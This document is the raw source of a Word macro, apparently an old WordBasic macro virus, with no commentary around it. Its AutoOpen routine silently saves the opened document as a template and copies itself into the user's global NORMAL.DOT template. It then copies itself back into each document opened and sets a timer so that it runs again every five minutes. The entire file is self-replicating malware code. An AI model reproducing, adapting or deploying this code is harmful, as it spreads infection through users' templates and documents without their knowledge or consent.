   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim MyFile$
   Dim x
   Dim normal
   Dim OkExist
   Dim i
   Dim TemplateName$
   Dim active
   Dim internal
   Dim alarmtime
   Dim alarm$

   ' set document mode
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   MyFile$ = WordBasic.[FileName$]()
   If InStr(1, MyFile$, "??") = 1 Then
       x = WordBasic.Dialog.FileSaveAs(dlg)
       MyFile$ = dlg.Name
   '   MsgBox MyFile$, Str$(dlg.AddToMru), 64
   Else
   '   dlg.Format = 0
       WordBasic.CurValues.FileSaveAs dlg
       MyFile$ = dlg.Name
   '   MsgBox MyFile$, Str$(dlg.AddToMru), 64
   End If

   ' if it is Macro Document, then goto bye2
   If WordBasic.IsMacro(0) = -1 Then GoTo Bye2

   ' if Document is new, then goto Bye1
   If MyFile$ = "" Then GoTo Bye1

   ' Save file as template
   If dlg.Format = 0 Then
       WordBasic.FileSaveAs Name:=MyFile$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
   Else
       WordBasic.FileSave
   End If

   ' search macro AutoOpen in Normal template
   normal = WordBasic.CountMacros(0)
   OkExist = 0
   For i = 1 To normal
       If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then OkExist = 1
   Next i

   ' Get normal template name
   TemplateName$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"
   'MsgBox TemplateName$, "", 64

   ' copy AutoOpen to normal template
   If OkExist <> 1 Then
       WordBasic.Organizer Copy:=1, Source:=MyFile$, Destination:=TemplateName$, Name:="AutoOpen", Tab:=3
   '   Organizer .Copy, .Source = MyFile$, .Destination = TemplateName$, .Name = "SaveDoc", .Tab = 3
       WordBasic.FileSaveAs Name:=TemplateName$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=0, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
   End If

   ' search macro AutoOpen in active document
   active = WordBasic.CountMacros(1)
   OkExist = 0
   For i = 1 To active
       If WordBasic.[MacroName$](i, 1) = "AutoOpen" Then OkExist = 1
   Next i

   ' copy AutoOpen to active template
   If OkExist <> 1 Then
       WordBasic.Organizer Copy:=1, Source:=TemplateName$, Destination:=MyFile$, Name:="AutoOpen", Tab:=3
   '   Organizer .Copy, .Source = TemplateName$, .Destination = MyFile$, .Name = "SaveDoc", .Tab = 3
       WordBasic.FileSave
   End If

   Bye1:

   ' set document mode
   dlg.Format = 0

   Bye2:

   ' set timer to run AutoOpen again
   internal = 5 / 24 / 60 ' internal time is 5 minutes
   alarmtime = WordBasic.TimeValue(WordBasic.[Time$]()) + internal
   alarm$ = WordBasic.[Time$](alarmtime)
   WordBasic.OnTime alarm$, "AutoOpen"

   End Sub
